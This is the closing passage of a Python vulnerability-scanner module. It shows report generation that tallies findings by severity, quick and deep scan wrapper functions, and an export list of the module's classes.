                    "cvss_score": v.cvss_score,
                    "verified": v.verified,
                    "evidence_count": len(v.evidence),
                    "remediation": v.remediation,
                }
                for v in self.results
            ],
            "summary": {
                "critical": len([v for v in self.results if v.severity == VulnSeverity.CRITICAL]),
                "high": len([v for v in self.results if v.severity == VulnSeverity.HIGH]),
                "medium": len([v for v in self.results if v.severity == VulnSeverity.MEDIUM]),
                "low": len([v for v in self.results if v.severity == VulnSeverity.LOW]),
            }
        }


# ==================== 便捷函数 ====================

def quick_scan(target: str) -> Dict[str, Any]:
    """快速扫描目标"""
    detector = EnhancedVulnerabilityDetector()
    detector.detect(target)
    return detector.generate_report()


def deep_scan(target: str) -> Dict[str, Any]:
    """深度扫描目标"""
    detector = EnhancedVulnerabilityDetector(timeout=15, max_threads=10)
    detector.detect(target)
    return detector.generate_report()


# ==================== 导出 ====================

__all__ = [
    "EnhancedVulnerabilityDetector",
    "VulnerabilityPatterns",
    "WAFDetector",
    "PayloadMutator",
    "DetectedVulnerability",
    "VulnSeverity",
    "VulnType",
    "quick_scan",
    "deep_scan",
]
